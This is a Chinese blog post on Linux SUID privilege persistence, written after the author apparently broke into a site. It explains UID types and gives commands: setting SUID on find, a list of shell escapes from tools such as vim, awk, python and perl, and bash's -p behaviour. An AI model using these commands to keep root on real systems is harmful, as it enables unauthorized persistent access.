前言：最近日站的时候拿到一个LINUX，提权成功后在做权限维持的时候图方便直接给VIM加了SUID，但是复验的时候发现，vim启用/bin/bash的时候权限并未升级。一时陷入了沉思，便去查阅了下资料。


１.LINUX用户ID分类

1.1EUID

有效用户ID（Effective UID，即EUID）与有效用户组ID（Effective Group ID，即EGID）在创建与访问文件的时候发挥作用；具体来说，创建文件时，系统内核将根据创建文件的进程的EUID与EGID设定文件的所有者/组属性，而在访问文件时，内核亦根据访问进程的EUID与EGID决定其能否访问文件。


1.2RGID

RGID真实用户ID（Real UID,即RUID）与真实用户组ID（Real GID，即RGID）用于辨识进程的真正所有者，且会影响到进程发送信号的权限。没有超级用户权限的进程仅在其RUID与目标进程的RUID相匹配时才能向目标进程发送信号，例如在父子进程间，子进程从父进程处继承了认证信息，使得父子进程间可以互相发送信号。


1.3SUID

暂存用户ID（Saved UID，即SUID）于以提升权限运行的进程暂时需要做一些不需特权的操作时使用，这种情况下进程会暂时将自己的有效用户ID从特权用户（常为root）对应的UID变为某个非特权用户对应的UID，而后将原有的特权用户UID复制为SUID暂存；之后当进程完成不需特权的操作后，进程使用SUID的值重置EUID以重新获得特权。在这里需要说明的是，无特权进程的EUID值只能设为与RUID、SUID与EUID（也即不改变）之一相同的值。


1.4 FSUID

文件系统用户ID（File System UID，即FSUID）在Linux中使用，且只用于对文件系统的访问权限控制，在没有明确设定的情况下与EUID相同（若FSUID为root的UID，则SUID、RUID与EUID必至少有一个为root的UID），且EUID改变也会影响到FSUID。设立FSUID是为了允许程序（如NFS服务器）在不需获取向给定UID账户发送信号的情况下以给定UID的权限来限定自己的文件系统权限。


2.SUID维持权限

suid维持权限的姿势有许多这边以find为例,当我们在root权限的时候给find添加suid权限

chmod u+s /usr/bin/find

这样当我们在低权限模式的时候就可以通过find进行root权限的部分操作了

find /etc/hosts -exec whoami \;

同样通过suid进行类似操作的还有以下:

1) From ftp > !/bin/sh or !/bin/bash2) From gdb > !/bin/sh or !/bin/bash3) From more/man/less > !/bin/sh or !/bin/bash4) From vim > !/bin/sh or !/bin/bash5) From rvim > :python import os; os.system("/bin/bash )6) From scp > scp -S /path/yourscript x y:7) From awk > awk 'BEGIN {system("/bin/sh or /bin/bash")}'8) From find > find / -name test -exec /bin/sh or /bin/bash \;9) From except > except spawn sh then sh.10) From python > python -c 'import os; os.system("/bin/sh")'11) From php > php -a then exec("sh -i");12) From perl > perl -e 'exec "/bin/sh";'13) From lua > os.execute('/bin/sh').14) From ruby > exec "/bin/sh"

3.SUID调用/bin/bash失败


当我尝试用含有suid的程序调用/bin/bash的时候发现失败了。

一开始以为是vim的更新导致的,去翻了一圈没有发现有类似的安全更新。


尝试用find调用/bin/bash结果也一样无法提权,这时候大概率就是LINUX对bash和sh进行了更新,继续上网查找资料,果真让我找到了一位老哥在阿里云发的文章。

https://xz.aliyun.com/t/7258

大家可以去看链接的分析过程,这里直接输出结果,Linux新版本的系统的bash增加了下述内容:

If the shell is started with the effective user (group) id not equal to the real user (group) id, and the -p option is not supplied,no startup files are read,shell functions are not inherited from the environment, the SHELLOPTS, BASHOPTS, CDPATH, and GLOBIGNORE variables, if they appear in the environment, are ignored, and the effective user id is set to the real user id. If the -p option is supplied at invocation, the startup behavior is the same, but the effective user id is not reset.

网页如下

https://linux.die.net/man/1/bash

如果启动bash时的EUID与RUID不相同，而且没有使用-p参数，则bash会将EUID还原成RUID。


这边我的RUID如下图所示为1002

当我通过拥有SUID的find去调用需要EUID权限为0(root)的/bin/bash的时候,我又没有带上-p参数,当出现这种情况的时候euid会重置为与RUID一致,也就是1002。
